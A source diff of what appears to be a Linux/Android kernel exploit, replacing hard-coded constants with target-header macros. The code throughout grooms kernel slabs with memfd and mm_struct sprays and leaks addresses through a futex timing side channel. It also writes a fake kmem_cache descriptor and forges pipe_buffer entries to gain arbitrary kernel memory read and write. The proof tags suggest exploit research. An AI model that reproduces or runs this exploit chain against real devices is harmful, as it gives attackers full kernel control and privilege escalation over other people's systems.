@@ -11,6 +11,7 @@
 #include <pthread.h>
 #include <sched.h>
 #include <signal.h>
+#include <stddef.h>
 #include <stdatomic.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -30,7 +31,7 @@
 #include "08_ashmem_configfs_rw.h"
 #include "90_diagnostic_checkpoint.h"
 #include "09_pipe_buffer_rw.h"
-#include "target_zzhl.h"
+#include "target.h"
 
 /* 03_mm_address_sidechannel/mm_address_leak.h contains the implementation and is already emitted once by
  * 05_mm_slab_grooming.c. Keep this translation unit on its public ABI to avoid duplicate
@@ -48,78 +49,7 @@ void kernelsnitch_set_profile(struct kernelsnitch_shared_state *ks,
                               size_t appended_futexes,
                               size_t repeat_measurement, size_t average);
 
-/* KernelSnitch measurement default (AVERAGE from 03_mm_address_sidechannel/mm_address_leak.h); the struct
- * is opaque in this TU so it is passed explicitly. */
-#define OSS_KSNITCH_AVERAGE 8
-#define OSS_KSNITCH_REPEAT_DEFAULT 128
-#define OSS_KSNITCH_APPENDED_DEFAULT 2048
-
-#define OSS_PAGE_SIZE 0x1000ULL
-#define OSS_PAGE_MASK (OSS_PAGE_SIZE - 1)
-#define OSS_MM_ORDER 3
-#define OSS_ORDER3_SIZE (OSS_PAGE_SIZE << OSS_MM_ORDER)
-#define OSS_MM_STRUCT_SIZE 0x400ULL
-#define OSS_MM_OBJECTS_PER_SLAB (OSS_ORDER3_SIZE / OSS_MM_STRUCT_SIZE)
-#define OSS_MM_PARTIALS 5
-#define OSS_KSNITCH_COLLISIONS 4
-#define OSS_SKB_SEND_SIZE 0x8e80
-
-#define OSS_PIPE_COUNT 240
-#define OSS_PIPE_SLOTS 32
 #define OSS_F_SETPIPE_SZ 0x407
-#define OSS_PIPE_OBJECT_SIZE 0x800
-#define OSS_PIPE_BUFFER_SIZE 0x28
-#define OSS_PIPE_CAN_MERGE 0x10
-#define OSS_PIPE_SCAN_CHUNK 0x400
-#define OSS_PIPE_ATTEMPTS 12
-#define OSS_PIPE_PREPARE_TIMEOUT_MS 20000
-#define OSS_PIPE_INSTALL_TIMEOUT_MS 120000
-#define OSS_PIPE_IO_TIMEOUT_MS 1000
-#define OSS_PIPE_MAX_SLABS (OSS_ORDER3_SIZE / OSS_PAGE_SIZE)
-
-#define OSS_DIRECT_MAP_BASE 0xffffff8000000000ULL
-#define OSS_DIRECT_MAP_END 0xffffff9000000000ULL
-#define OSS_VMEMMAP_START 0xfffffffe00000000ULL
-#define OSS_VMEMMAP_END 0xfffffffe40000000ULL
-#define OSS_STRUCT_PAGE_SIZE ZZHL_STRUCT_PAGE_SIZE
-#define OSS_STRUCT_PAGE_COMPOUND_HEAD_OFF ZZHL_PAGE_COMPOUND_HEAD_OFF
-#define OSS_STRUCT_SLAB_CACHE_OFF ZZHL_PAGE_SLAB_CACHE_OFF
-#define OSS_KMEM_CACHE_DESC_SIZE ZZHL_KMEM_CACHE_DESC_SIZE
-#define OSS_KMEM_CACHE_SIZE_OFF ZZHL_KMEM_CACHE_SIZE_OFF
-#define OSS_KMEM_CACHE_OBJECT_SIZE_OFF ZZHL_KMEM_CACHE_OBJECT_SIZE_OFF
-#define OSS_KMEM_CACHE_INUSE_OFF ZZHL_KMEM_CACHE_INUSE_OFF
-#define OSS_KMEM_CACHE_ALIGN_OFF ZZHL_KMEM_CACHE_ALIGN_OFF
-#define OSS_KMEM_CACHE_USEROFFSET_OFF ZZHL_KMEM_CACHE_USEROFFSET_OFF
-#define OSS_KMEM_CACHE_USERSIZE_OFF ZZHL_KMEM_CACHE_USERSIZE_OFF
-
-#define OSS_KMALLOC_CACHES_OFF ZZHL_KMALLOC_CACHES_OFF
-#define OSS_ANON_PIPE_BUF_OPS_OFF ZZHL_ANON_PIPE_BUF_OPS_OFF
-
-#define OSS_INIT_TASK_OFF ZZHL_INIT_TASK_OFF
-#define OSS_TASK_TASKS_OFF ZZHL_TASK_TASKS_OFF
-#define OSS_TASK_PID_OFF ZZHL_TASK_PID_OFF
-#define OSS_TASK_COMM_OFF ZZHL_TASK_COMM_OFF
-#define OSS_TASK_FILES_OFF ZZHL_TASK_FILES_OFF
-#define OSS_TASK_CACHE_SIZE ZZHL_TASK_CACHE_SIZE
-#define OSS_FILES_FDT_OFF ZZHL_FILES_FDT_OFF
-#define OSS_FILES_CACHE_SIZE ZZHL_FILES_CACHE_SIZE
-#define OSS_FDTABLE_FD_OFF ZZHL_FDTABLE_FD_OFF
-#define OSS_FILE_PRIVATE_DATA_OFF ZZHL_FILE_PRIVATE_DATA_OFF
-#define OSS_FILE_CACHE_SIZE ZZHL_FILE_CACHE_SIZE
-#define OSS_PIPE_HEAD_OFF ZZHL_PIPE_HEAD_OFF
-#define OSS_PIPE_TAIL_OFF ZZHL_PIPE_TAIL_OFF
-#define OSS_PIPE_RING_SIZE_OFF ZZHL_PIPE_RING_SIZE_OFF
-#define OSS_PIPE_BUFS_OFF ZZHL_PIPE_BUFS_OFF
-#define OSS_PIPE_BUF_PAGE_OFF ZZHL_PIPE_BUFFER_PAGE_OFF
-#define OSS_PIPE_BUF_OPS_OFF ZZHL_PIPE_BUFFER_OPS_OFF
-#define OSS_PIPE_BUF_STRIDE ZZHL_PIPE_BUFFER_STRIDE
-#define OSS_KMALLOC_BUCKETS 14
-#define OSS_KMALLOC_NORMAL_2K_SLOT 11
-#define OSS_KMALLOC_CGROUP_2K_SLOT (2 * OSS_KMALLOC_BUCKETS + 11)
-#define OSS_KMALLOC_CACHE_SLOTS 56
-
-#define OSS_PROOF_OFF 0x7100ULL
-#define OSS_FAKE_KMEM_CACHE_OFF 0x7400ULL
 #define OSS_PROOF_READ_TAG "nebusec_70687973727730"
 #define OSS_PROOF_WRITE_TAG "nebusec_70687973727731"
 #define OSS_PROOF_READ 0x306365737562656eULL /* "nebusec0" */
@@ -195,15 +125,21 @@ struct pipe_attempt_diag {
   uint64_t elapsed_ms;
 };
 
-_Static_assert(sizeof(struct oss_pipe_buffer) == OSS_PIPE_BUFFER_SIZE,
+_Static_assert(sizeof(struct oss_pipe_buffer) == TARGET_PIPE_BUFFER_STRIDE,
                "pipe_buffer layout");
+_Static_assert(offsetof(struct oss_pipe_buffer, page) ==
+                   TARGET_PIPE_BUFFER_PAGE_OFF,
+               "pipe_buffer.page layout");
+_Static_assert(offsetof(struct oss_pipe_buffer, ops) ==
+                   TARGET_PIPE_BUFFER_OPS_OFF,
+               "pipe_buffer.ops layout");
 
 static pthread_once_t g_init_once = PTHREAD_ONCE_INIT;
 static atomic_int g_prepare_request;
 static atomic_int g_prepare_done;
 static atomic_int g_prepare_ok;
-static int g_drain_pipes[OSS_PIPE_COUNT][2];
-static int g_reclaim_pipes[OSS_PIPE_COUNT][2];
+static int g_drain_pipes[TARGET_PIPE_COUNT][2];
+static int g_reclaim_pipes[TARGET_PIPE_COUNT][2];
 static pid_t g_holder_pid = -1;
 static uint64_t g_pipe_page_base;
 static uint64_t g_victim_addr;
@@ -284,7 +220,7 @@ static const char *pipe_collision_failure_name(enum pipe_collision_failure failu
 }
 
 static void state_init_once(void) {
-  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
+  for (size_t i = 0; i < TARGET_PIPE_COUNT; i++) {
     g_drain_pipes[i][0] = -1;
     g_drain_pipes[i][1] = -1;
     g_reclaim_pipes[i][0] = -1;
@@ -311,11 +247,11 @@ static int pin_cpu0(void) {
 
 static int set_pipe_slots(int pipefd[2], int slots) {
   return fcntl(pipefd[0], OSS_F_SETPIPE_SZ,
-               slots * (int)OSS_PAGE_SIZE) != -1;
+               slots * (int)TARGET_PAGE_SIZE) != -1;
 }
 
-static void close_pipe_bank(int bank[OSS_PIPE_COUNT][2]) {
-  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
+static void close_pipe_bank(int bank[TARGET_PIPE_COUNT][2]) {
+  for (size_t i = 0; i < TARGET_PIPE_COUNT; i++) {
     if (bank[i][0] >= 0) {
       close(bank[i][0]);
       bank[i][0] = -1;
@@ -327,8 +263,8 @@ static void close_pipe_bank(int bank[OSS_PIPE_COUNT][2]) {
   }
 }
 
-static int create_pipe_bank(int bank[OSS_PIPE_COUNT][2]) {
-  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
+static int create_pipe_bank(int bank[TARGET_PIPE_COUNT][2]) {
+  for (size_t i = 0; i < TARGET_PIPE_COUNT; i++) {
     if (pipe(bank[i]) != 0 || !set_pipe_slots(bank[i], 2)) {
       if (bank[i][0] >= 0) {
         close(bank[i][0]);
@@ -344,8 +280,8 @@ static int create_pipe_bank(int bank[OSS_PIPE_COUNT][2]) {
   return 1;
 }
 
-static int resize_pipe_bank(int bank[OSS_PIPE_COUNT][2], int slots) {
-  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
+static int resize_pipe_bank(int bank[TARGET_PIPE_COUNT][2], int slots) {
+  for (size_t i = 0; i < TARGET_PIPE_COUNT; i++) {
     if (bank[i][0] < 0 || !set_pipe_slots(bank[i], slots)) {
       return 0;
     }
@@ -468,13 +404,13 @@ static int close_memfd_at(struct oss_mm_ctx *ctx, size_t index) {
 static int send_skb(int sock, void *buffer) {
   struct iovec iov = {
       .iov_base = buffer,
-      .iov_len = OSS_SKB_SEND_SIZE,
+      .iov_len = TARGET_RECLAIM_BUFFER_SIZE,
   };
   struct msghdr msg;
   memset(&msg, 0, sizeof(msg));
   msg.msg_iov = &iov;
   msg.msg_iovlen = 1;
-  return sendmsg(sock, &msg, 0) == (ssize_t)OSS_SKB_SEND_SIZE;
+  return sendmsg(sock, &msg, 0) == (ssize_t)TARGET_RECLAIM_BUFFER_SIZE;
 }
 
 static void set_prepare_progress(struct pipe_prepare_progress *progress,
@@ -539,10 +475,10 @@ static uint64_t prepare_pipe_page_child(
   raise_rlimit_best_effort(RLIMIT_NOFILE);
   raise_rlimit_best_effort(RLIMIT_NPROC);
   set_prepare_progress(progress, PIPE_STAGE_CONTEXTS);
-  if (!init_mm_ctx(&prep, 32 * OSS_MM_OBJECTS_PER_SLAB) ||
-      !init_mm_ctx(&spray, (1 + OSS_MM_PARTIALS) * OSS_MM_OBJECTS_PER_SLAB) ||
-      !init_mm_ctx(&pre, OSS_MM_OBJECTS_PER_SLAB - 1) ||
-      !init_mm_ctx(&post, OSS_MM_OBJECTS_PER_SLAB)) {
+  if (!init_mm_ctx(&prep, 32 * TARGET_MM_OBJECTS_PER_SLAB) ||
+      !init_mm_ctx(&spray, (1 + TARGET_MM_PARTIALS) * TARGET_MM_OBJECTS_PER_SLAB) ||
+      !init_mm_ctx(&pre, TARGET_MM_OBJECTS_PER_SLAB - 1) ||
+      !init_mm_ctx(&post, TARGET_MM_OBJECTS_PER_SLAB)) {
     goto out;
   }
   set_prepare_progress(progress, PIPE_STAGE_PINNED_MM);
@@ -552,21 +488,21 @@ static uint64_t prepare_pipe_page_child(
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   set_prepare_progress(progress, PIPE_STAGE_KSNITCH_SETUP);
-  g_ks = kernelsnitch_setup(OSS_MM_STRUCT_SIZE, OSS_MM_ORDER, cpu_count,
-                            OSS_KSNITCH_COLLISIONS, 0, 0);
+  g_ks = kernelsnitch_setup(TARGET_MM_STRUCT_SIZE, TARGET_MM_SLAB_ORDER, cpu_count,
+                            TARGET_KSNITCH_COLLISIONS, 0, 0);
   if (!g_ks || !fill_dead_mm_ctx(&pre)) {
     goto out;
   }
   {
     long ks_appended = pipe_env_long_clamped(
-        "KSNITCH_APPENDED", OSS_KSNITCH_APPENDED_DEFAULT, 256, 4096);
+        "KSNITCH_APPENDED", TARGET_KSNITCH_APPENDED_PIPE, 256, 4096);
     long ks_repeat = pipe_env_long_clamped(
-        "KSNITCH_REPEAT", OSS_KSNITCH_REPEAT_DEFAULT, OSS_KSNITCH_AVERAGE,
-        OSS_KSNITCH_REPEAT_DEFAULT);
+        "KSNITCH_REPEAT", TARGET_KSNITCH_REPEAT_PIPE, TARGET_KSNITCH_AVERAGE,
+        TARGET_KSNITCH_REPEAT_PIPE);
     kernelsnitch_set_profile(g_ks, (size_t)ks_appended, (size_t)ks_repeat,
-                              OSS_KSNITCH_AVERAGE);
+                              TARGET_KSNITCH_AVERAGE);
     fprintf(stderr, "[pipe_rw] ksnitch profile appended=%ld repeat=%ld average=%d\n",
-            ks_appended, ks_repeat, OSS_KSNITCH_AVERAGE);
+            ks_appended, ks_repeat, TARGET_KSNITCH_AVERAGE);
   }
   set_prepare_progress(progress, PIPE_STAGE_COLLISIONS);
   leak_child = spawn_collision_child();
@@ -599,11 +535,11 @@ static uint64_t prepare_pipe_page_child(
     goto out;
   }
 
-  skb = malloc(OSS_SKB_SEND_SIZE);
+  skb = malloc(TARGET_RECLAIM_BUFFER_SIZE);
   if (!skb) {
     goto out;
   }
-  memset(skb, 0x50, OSS_SKB_SEND_SIZE);
+  memset(skb, 0x50, TARGET_RECLAIM_BUFFER_SIZE);
 
   set_prepare_progress(progress, PIPE_STAGE_SOCKET_RECLAIM);
   if (socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim) != 0 ||
@@ -625,7 +561,7 @@ static uint64_t prepare_pipe_page_child(
       goto out;
     }
   }
-  for (size_t i = 0; i < spray.count; i += OSS_MM_OBJECTS_PER_SLAB) {
+  for (size_t i = 0; i < spray.count; i += TARGET_MM_OBJECTS_PER_SLAB) {
     if (!close_memfd_at(&spray, i)) {
       goto out;
     }
@@ -649,13 +585,13 @@ static uint64_t prepare_pipe_page_child(
   if (leaked == (size_t)-1) {
     goto out;
   }
-  base = (uint64_t)leaked & ~(OSS_ORDER3_SIZE - 1);
+  base = (uint64_t)leaked & ~(TARGET_ORDER3_SIZE - 1);
 
   set_prepare_progress(progress, PIPE_STAGE_RESIZE_DRAIN);
   /* kernelsnitch_bruteforce() resets the caller's affinity. Restore CPU0
    * before the first pipe-ring allocation so the drain and reclaim banks
    * consume pages from the same per-CPU allocator lists. */
-  if (!pin_cpu0() || !resize_pipe_bank(g_drain_pipes, OSS_PIPE_SLOTS)) {
+  if (!pin_cpu0() || !resize_pipe_bank(g_drain_pipes, TARGET_PIPE_SLOTS)) {
     base = 0;
     goto out;
   }
@@ -663,7 +599,7 @@ static uint64_t prepare_pipe_page_child(
   close(reclaim[1]);
   reclaim[0] = reclaim[1] = -1;
   set_prepare_progress(progress, PIPE_STAGE_RESIZE_RECLAIM);
-  if (!resize_pipe_bank(g_reclaim_pipes, OSS_PIPE_SLOTS)) {
+  if (!resize_pipe_bank(g_reclaim_pipes, TARGET_PIPE_SLOTS)) {
     base = 0;
     goto out;
   }
@@ -867,21 +803,21 @@ static uint64_t prepare_pipe_page(int timeout_ms, struct pipe_attempt_diag *diag
 }
 
 static int is_direct_ptr(uint64_t addr) {
-  return addr >= OSS_DIRECT_MAP_BASE && addr < OSS_DIRECT_MAP_END;
+  return addr >= TARGET_LINEAR_MAP_BASE && addr < TARGET_LINEAR_MAP_END;
 }
 
 static uint64_t direct_to_page(uint64_t addr) {
-  return OSS_VMEMMAP_START +
-         (((addr - OSS_DIRECT_MAP_BASE) >> 12) * OSS_STRUCT_PAGE_SIZE);
+  return TARGET_VMEMMAP_START +
+         (((addr - TARGET_LINEAR_MAP_BASE) >> 12) * TARGET_STRUCT_PAGE_SIZE);
 }
 
 static uint64_t page_to_direct(uint64_t page) {
-  if (page < OSS_VMEMMAP_START || page >= OSS_VMEMMAP_END ||
-      (page - OSS_VMEMMAP_START) % OSS_STRUCT_PAGE_SIZE != 0) {
+  if (page < TARGET_VMEMMAP_START || page >= TARGET_VMEMMAP_END ||
+      (page - TARGET_VMEMMAP_START) % TARGET_STRUCT_PAGE_SIZE != 0) {
     return 0;
   }
-  return OSS_DIRECT_MAP_BASE +
-         ((page - OSS_VMEMMAP_START) / OSS_STRUCT_PAGE_SIZE) * OSS_PAGE_SIZE;
+  return TARGET_LINEAR_MAP_BASE +
+         ((page - TARGET_VMEMMAP_START) / TARGET_STRUCT_PAGE_SIZE) * TARGET_PAGE_SIZE;
 }
 
 struct slab_cache_guard {
@@ -895,18 +831,18 @@ static void put_u32(unsigned char *buffer, size_t offset, uint32_t value) {
 }
 
 static int write_fake_kmem_cache(int fd, uint32_t cache_size) {
-  uint64_t address = g_payload_base + OSS_FAKE_KMEM_CACHE_OFF;
+  uint64_t address = g_payload_base + TARGET_FAKE_KMEM_CACHE_LIVE_OFF;
   if (g_fake_cache_addr == address && g_fake_cache_size == cache_size) {
     return 1;
   }
-  unsigned char descriptor[OSS_KMEM_CACHE_DESC_SIZE];
+  unsigned char descriptor[TARGET_KMEM_CACHE_DESC_SIZE];
   memset(descriptor, 0, sizeof(descriptor));
-  put_u32(descriptor, OSS_KMEM_CACHE_SIZE_OFF, cache_size);
-  put_u32(descriptor, OSS_KMEM_CACHE_OBJECT_SIZE_OFF, cache_size);
-  put_u32(descriptor, OSS_KMEM_CACHE_INUSE_OFF, cache_size);
-  put_u32(descriptor, OSS_KMEM_CACHE_ALIGN_OFF, 8);
-  put_u32(descriptor, OSS_KMEM_CACHE_USEROFFSET_OFF, 0);
-  put_u32(descriptor, OSS_KMEM_CACHE_USERSIZE_OFF, cache_size);
+  put_u32(descriptor, TARGET_KMEM_CACHE_SIZE_OFF, cache_size);
+  put_u32(descriptor, TARGET_KMEM_CACHE_OBJECT_SIZE_OFF, cache_size);
+  put_u32(descriptor, TARGET_KMEM_CACHE_INUSE_OFF, cache_size);
+  put_u32(descriptor, TARGET_KMEM_CACHE_ALIGN_OFF, 8);
+  put_u32(descriptor, TARGET_KMEM_CACHE_USEROFFSET_OFF, 0);
+  put_u32(descriptor, TARGET_KMEM_CACHE_USERSIZE_OFF, cache_size);
   if (!oss_kernel_write(fd, address, descriptor, sizeof(descriptor))) {
     fprintf(stderr,
             "[pipe_rw] guard: fake-cache write failed addr=%016llx size=%u "
@@ -945,7 +881,7 @@ static int slab_cache_guard_begin(int fd, uint64_t object,
   }
   uint64_t page = direct_to_page(object);
   uint64_t compound =
-      oss_kernel_read64(fd, page + OSS_STRUCT_PAGE_COMPOUND_HEAD_OFF);
+      oss_kernel_read64(fd, page + TARGET_PAGE_COMPOUND_HEAD_OFF);
   if (compound == UINT64_MAX) {
     fprintf(stderr,
             "[pipe_rw] guard: compound read failed object=%016llx "
@@ -956,7 +892,7 @@ static int slab_cache_guard_begin(int fd, uint64_t object,
   if (compound & 1) {
     page = compound & ~1ULL;
   }
-  guard->slot = page + OSS_STRUCT_SLAB_CACHE_OFF;
+  guard->slot = page + TARGET_PAGE_SLAB_CACHE_OFF;
   guard->original = oss_kernel_read64(fd, guard->slot);
   if (!is_direct_ptr(guard->original)) {
     fprintf(stderr,
@@ -967,7 +903,7 @@ static int slab_cache_guard_begin(int fd, uint64_t object,
             (unsigned long long)guard->original);
     return 0;
   }
-  uint64_t fake = g_payload_base + OSS_FAKE_KMEM_CACHE_OFF;
+  uint64_t fake = g_payload_base + TARGET_FAKE_KMEM_CACHE_LIVE_OFF;
   if (!oss_kernel_write64(fd, guard->slot, fake)) {
     int saved_errno = errno;
     int restored = oss_kernel_write64(fd, guard->slot, guard->original);
@@ -996,27 +932,27 @@ static int slab_cache_guard_begin(int fd, uint64_t object,
   return 1;
 }
 
-static int collect_pipe_slabs(int fd, uint64_t slabs[OSS_PIPE_MAX_SLABS],
+static int collect_pipe_slabs(int fd, uint64_t slabs[TARGET_PIPE_MAX_SLABS],
                               size_t *slab_count) {
-  uint64_t caches[OSS_KMALLOC_CACHE_SLOTS];
-  uint64_t caches_addr = g_kernel_base + OSS_KMALLOC_CACHES_OFF;
+  uint64_t caches[TARGET_KMALLOC_CACHE_SLOTS];
+  uint64_t caches_addr = g_kernel_base + TARGET_KMALLOC_CACHES_OFF;
   *slab_count = 0;
   if (!oss_kernel_read(fd, caches_addr, caches, sizeof(caches))) {
     return 0;
   }
-  uint64_t normal_2k = caches[OSS_KMALLOC_NORMAL_2K_SLOT];
-  uint64_t cgroup_2k = caches[OSS_KMALLOC_CGROUP_2K_SLOT];
-  uint64_t observed_cache[OSS_PIPE_MAX_SLABS] = {0};
+  uint64_t normal_2k = caches[TARGET_KMALLOC_NORMAL_2K_SLOT];
+  uint64_t cgroup_2k = caches[TARGET_KMALLOC_CGROUP_2K_SLOT];
+  uint64_t observed_cache[TARGET_PIPE_MAX_SLABS] = {0};
   size_t matching_pages = 0;
   if (!is_direct_ptr(normal_2k) || !is_direct_ptr(cgroup_2k)) {
     return 0;
   }
 
-  for (uint64_t off = 0; off < OSS_ORDER3_SIZE; off += OSS_PAGE_SIZE) {
+  for (uint64_t off = 0; off < TARGET_ORDER3_SIZE; off += TARGET_PAGE_SIZE) {
     uint64_t page_addr = g_pipe_page_base + off;
     uint64_t page = direct_to_page(page_addr);
     uint64_t compound_head = oss_kernel_read64(fd,
-        page + OSS_STRUCT_PAGE_COMPOUND_HEAD_OFF);
+        page + TARGET_PAGE_COMPOUND_HEAD_OFF);
     if (compound_head == UINT64_MAX) {
       return 0;
     }
@@ -1024,8 +960,8 @@ static int collect_pipe_slabs(int fd, uint64_t slabs[OSS_PIPE_MAX_SLABS],
       page = compound_head & ~1ULL;
     }
     uint64_t slab_cache = oss_kernel_read64(
-        fd, page + OSS_STRUCT_SLAB_CACHE_OFF);
-    observed_cache[off / OSS_PAGE_SIZE] = slab_cache;
+        fd, page + TARGET_PAGE_SLAB_CACHE_OFF);
+    observed_cache[off / TARGET_PAGE_SIZE] = slab_cache;
     if (slab_cache == normal_2k || slab_cache == cgroup_2k) {
       matching_pages++;
       uint64_t slab_base = page_to_direct(page);
@@ -1036,7 +972,7 @@ static int collect_pipe_slabs(int fd, uint64_t slabs[OSS_PIPE_MAX_SLABS],
       while (i < *slab_count && slabs[i] != slab_base) {
         i++;
       }
-      if (i == *slab_count && *slab_count < OSS_PIPE_MAX_SLABS) {
+      if (i == *slab_count && *slab_count < TARGET_PIPE_MAX_SLABS) {
         slabs[(*slab_count)++] = slab_base;
       }
     }
@@ -1078,8 +1014,8 @@ static void fill_pipe_marker(unsigned char *marker, size_t pipe_index,
 }
 
 static int populate_pipe_markers(void) {
-  unsigned char marker[OSS_PIPE_COUNT];
-  for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
+  unsigned char marker[TARGET_PIPE_COUNT];
+  for (size_t i = 0; i < TARGET_PIPE_COUNT; i++) {
     fill_pipe_marker(marker, i, i + 1);
     if (!write_full(g_reclaim_pipes[i][1], marker, i + 1)) {
       return 0;
@@ -1108,9 +1044,9 @@ static int read_full(int fd, void *buffer, size_t length) {
 
 static int peek_pipe_marker(int pipe_index, size_t length) {
   int duplicate[2] = {-1, -1};
-  unsigned char got[OSS_PIPE_COUNT + 1];
-  unsigned char want[OSS_PIPE_COUNT + 1];
-  if (pipe_index < 0 || pipe_index >= OSS_PIPE_COUNT || length > sizeof(got) ||
+  unsigned char got[TARGET_PIPE_COUNT + 1];
+  unsigned char want[TARGET_PIPE_COUNT + 1];
+  if (pipe_index < 0 || pipe_index >= TARGET_PIPE_COUNT || length > sizeof(got) ||
       pipe(duplicate) != 0) {
     return 0;
   }
@@ -1136,7 +1072,7 @@ static int validate_pipe_ring(int pipe_index, size_t expected_len,
    * one-buffer ring state: tail=0, head=1. tee() keeps it non-destructive. */
   int capacity = fcntl(g_reclaim_pipes[pipe_index][0], F_GETPIPE_SZ);
   int readable = -1;
-  if (capacity != OSS_PIPE_SLOTS * (int)OSS_PAGE_SIZE) {
+  if (capacity != TARGET_PIPE_SLOTS * (int)TARGET_PAGE_SIZE) {
     *reason = "capacity";
     return 0;
   }
@@ -1155,25 +1091,25 @@ static int validate_pipe_ring(int pipe_index, size_t expected_len,
 
 static int is_structural_pipe_candidate(const struct oss_pipe_buffer *buffer,
                                         uint64_t anon_ops) {
-  return buffer->page >= OSS_VMEMMAP_START &&
-         buffer->page < OSS_VMEMMAP_END && buffer->offset == 0 &&
-         buffer->len != 0 && buffer->len <= OSS_PIPE_COUNT &&
-         buffer->ops == anon_ops && buffer->flags == OSS_PIPE_CAN_MERGE &&
+  return buffer->page >= TARGET_VMEMMAP_START &&
+         buffer->page < TARGET_VMEMMAP_END && buffer->offset == 0 &&
+         buffer->len != 0 && buffer->len <= TARGET_PIPE_COUNT &&
+         buffer->ops == anon_ops && buffer->flags == TARGET_PIPE_CAN_MERGE &&
          buffer->private == 0;
 }
 
 static int try_pipe_slab_candidates(int fd, uint64_t slab_base,
                                     size_t slab_index, enum pipe_error *error) {
   oss_diag_checkpoint("pipe-slab-read-start");
-  unsigned char *slab = malloc(OSS_ORDER3_SIZE);
+  unsigned char *slab = malloc(TARGET_ORDER3_SIZE);
   if (!slab) {
     *error = PIPE_E_VICTIM_SCAN;
     return 0;
   }
-  for (uint64_t off = 0; off < OSS_ORDER3_SIZE;
-       off += OSS_PIPE_SCAN_CHUNK) {
+  for (uint64_t off = 0; off < TARGET_ORDER3_SIZE;
+       off += TARGET_PIPE_SCAN_CHUNK) {
     if (!oss_kernel_read(fd, slab_base + off, slab + off,
-                         OSS_PIPE_SCAN_CHUNK)) {
+                         TARGET_PIPE_SCAN_CHUNK)) {
       free(slab);
       *error = PIPE_E_VICTIM_SCAN;
       return 0;
@@ -1181,29 +1117,29 @@ static int try_pipe_slab_candidates(int fd, uint64_t slab_base,
   }
   oss_diag_checkpoint("pipe-slab-read-done");
 
-  uint64_t anon_ops = g_kernel_base + OSS_ANON_PIPE_BUF_OPS_OFF;
+  uint64_t anon_ops = g_kernel_base + TARGET_ANON_PIPE_BUF_OPS_OFF;
   size_t structural = 0;
   size_t ring_valid = 0;
   size_t proofs = 0;
-  size_t page_candidates[OSS_PIPE_MAX_SLABS] = {0};
+  size_t page_candidates[TARGET_PIPE_MAX_SLABS] = {0};
   for (uint64_t off = 0;
-       off + sizeof(struct oss_pipe_buffer) <= OSS_ORDER3_SIZE; off += 8) {
+       off + sizeof(struct oss_pipe_buffer) <= TARGET_ORDER3_SIZE; off += 8) {
     struct oss_pipe_buffer candidate;
     memcpy(&candidate, slab + off, sizeof(candidate));
     if (is_structural_pipe_candidate(&candidate, anon_ops)) {
-      page_candidates[off / OSS_PAGE_SIZE]++;
+      page_candidates[off / TARGET_PAGE_SIZE]++;
     }
   }
-  for (size_t page = 0; page < OSS_PIPE_MAX_SLABS; page++) {
+  for (size_t page = 0; page < TARGET_PIPE_MAX_SLABS; page++) {
     fprintf(stderr,
             "[pipe_rw] selection page slab=%zu page=%zu base=%016llx "
             "candidates=%zu\n",
             slab_index, page,
-            (unsigned long long)(slab_base + page * OSS_PAGE_SIZE),
+            (unsigned long long)(slab_base + page * TARGET_PAGE_SIZE),
             page_candidates[page]);
   }
   for (uint64_t off = 0;
-       off + sizeof(struct oss_pipe_buffer) <= OSS_ORDER3_SIZE; off += 8) {
+       off + sizeof(struct oss_pipe_buffer) <= TARGET_ORDER3_SIZE; off += 8) {
     struct oss_pipe_buffer before;
     memcpy(&before, slab + off, sizeof(before));
     if (!is_structural_pipe_candidate(&before, anon_ops)) {
@@ -1211,7 +1147,7 @@ static int try_pipe_slab_candidates(int fd, uint64_t slab_base,
     }
     structural++;
 
-    uint64_t object_offset = off % OSS_PIPE_OBJECT_SIZE;
+    uint64_t object_offset = off % TARGET_PIPE_OBJECT_SIZE;
     if (object_offset % sizeof(struct oss_pipe_buffer) != 0) {
       fprintf(stderr,
               "[pipe_rw] candidate reject slab=%zu off=%04llx reason=slot-align\n",
@@ -1286,7 +1222,7 @@ static int try_pipe_slab_candidates(int fd, uint64_t slab_base,
             (unsigned long long)off, (unsigned long long)victim, slot, index,
             after.len,
             (unsigned long long)before.page,
-            (unsigned long long)direct_to_page(g_payload_base + OSS_PROOF_OFF));
+            (unsigned long long)direct_to_page(g_payload_base + TARGET_PIPE_PROOF_LIVE_OFF));
     char proof_stage[96];
     snprintf(proof_stage, sizeof(proof_stage),
              "pipe-proof-start slab=%zu off=%llx pipe=%d len=%u", slab_index,
@@ -1337,7 +1273,7 @@ static int fd_restore_flags(int fd, int saved_flags) {
 
 static int pipe_io_bounded(int fd, void *buffer, size_t length, int writing) {
   unsigned char *cursor = buffer;
-  uint64_t deadline_ms = monotonic_ms() + OSS_PIPE_IO_TIMEOUT_MS;
+  uint64_t deadline_ms = monotonic_ms() + TARGET_PIPE_IO_TIMEOUT_MS;
   while (length != 0) {
     ssize_t n = writing ? write(fd, cursor, length) : read(fd, cursor, length);
     if (n > 0) {
@@ -1374,7 +1310,7 @@ static int pipe_io_bounded(int fd, void *buffer, size_t length, int writing) {
 static int pipe_rw_read_once(int fd, uint64_t addr, void *buf, size_t len) {
   if (!g_victim_addr || g_victim_pipe < 0 || !g_victim_saved_valid ||
       !is_direct_ptr(addr) || !len ||
-      (addr & OSS_PAGE_MASK) + len > OSS_PAGE_SIZE) {
+      (addr & TARGET_PAGE_MASK) + len > TARGET_PAGE_SIZE) {
     errno = ENODATA;
     return 0;
   }
@@ -1386,10 +1322,10 @@ static int pipe_rw_read_once(int fd, uint64_t addr, void *buf, size_t len) {
   }
   struct oss_pipe_buffer forged = saved;
   forged.page = direct_to_page(addr);
-  forged.offset = (uint32_t)(addr & OSS_PAGE_MASK);
+  forged.offset = (uint32_t)(addr & TARGET_PAGE_MASK);
   forged.len = (uint32_t)len + 1;
-  forged.ops = g_kernel_base + OSS_ANON_PIPE_BUF_OPS_OFF;
-  forged.flags = OSS_PIPE_CAN_MERGE;
+  forged.ops = g_kernel_base + TARGET_ANON_PIPE_BUF_OPS_OFF;
+  forged.flags = TARGET_PIPE_CAN_MERGE;
   forged.private = 0;
   if (!oss_kernel_write(fd, g_victim_addr, &forged, sizeof(forged))) {
     /* A short write may already have changed part of the live descriptor.
@@ -1414,7 +1350,7 @@ static int pipe_rw_write_once(int fd, uint64_t addr, const void *buf,
